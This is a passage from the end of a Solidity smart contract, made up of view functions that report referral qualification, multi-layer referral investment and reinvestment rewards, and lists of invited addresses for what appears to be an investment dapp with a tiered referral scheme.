        return fomoTotalRewardDistributed;
    }

// ***user referral function***

    function getIsQualified(address _addr) public view returns(bool){
        bool natureBool = numRealRef[_addr]>=minQualifiedRefNumber;
        bool ceoBool = appointedQualified[_addr];
        if (natureBool||ceoBool){
            return true;
        }else{
            return false;
        }
    }

    function getMyRealRefNumber() public view returns(uint256){
        return numRealRef[msg.sender];
    }

    function getRealRefNumber(address _addr) public view returns(uint256){
        return numRealRef[_addr];
    }

    function getMySon() public view returns(referralDetails[] memory){

        uint256 length = 5;

        if(getIsQualified( msg.sender)){
            length = 10;
        }
        
        referralDetails[] memory returndata = new referralDetails[](length);
        for (uint i = 1; i < 6; i++) {
            returndata[i-1] = referralDetails(i,referralRates[i-1],addressToReferralInvestAmount[msg.sender][i] ,referralRates[i-1],addressToReferralReInvestAmount[msg.sender][i]);
        }
        if(getIsQualified( msg.sender)){
            for (uint i = 6; i < 11; i++) {
            returndata[i-1] = referralDetails(i,referralRates[i-1],addressToReferralInvestAmount[msg.sender][i] ,referralRates[i-1],addressToReferralReInvestAmount[msg.sender][i]);
            }
        }
        return returndata;
    }

    function getMyinviteReward() public view returns(uint256){
        uint256 returndata = 0;
        for(uint i=1;i<11;i++){
            returndata += addressToReferralReInvestAmount[msg.sender][i];    
        }
        return returndata;
    }

    function getInviteRewardEachLayer(address _addr, uint256 _layer) public view returns(uint256){
        return addressToReferralReInvestAmount[_addr][_layer];     
    }


    function getInviteReward(address _addr) public view returns(uint256){
        uint256 returndata = 0;
        for(uint i=1;i<11;i++){
            returndata += addressToReferralReInvestAmount[_addr][i];    
        }
        return returndata;
    }

    function getMyInviteAddress() public view returns(address[] memory){
        return myInviteAddress[msg.sender];
    }

    function getInviteAddress(address _addr ) public view returns(address[] memory){
        return myInviteAddress[_addr];
    }

    function getMyReferralAmount() public view returns(address[] memory, uint256[] memory){
        uint256 lenMyInvite = myInviteAddress[msg.sender].length;
        uint256[] memory inviteNum = new uint256[](lenMyInvite);
        for(uint i=0;i<lenMyInvite;i++){
            inviteNum[i] = myInviteAddress[myInviteAddress[msg.sender][i]].length;
        }
        return (myInviteAddress[msg.sender],inviteNum);
    }    

    fallback() external payable{}

}